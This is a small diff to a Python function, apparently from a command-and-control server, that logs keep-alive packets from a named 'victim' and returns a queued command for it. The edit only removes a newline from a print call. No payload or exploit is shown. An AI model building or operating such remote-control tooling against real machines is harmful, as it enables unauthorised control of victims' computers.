@@ -50,7 +50,7 @@ def handle_load(load, path, sender_ip):
     else:
         print(f"\nkeep-alive packet from {victim_name}[{sender_ip}] received")
         command = get_victim_command(victim_name, path)
-        print(f"sent command: {command}\n")
+        print(f"sent command: {command}")
         return command
 
     return ""
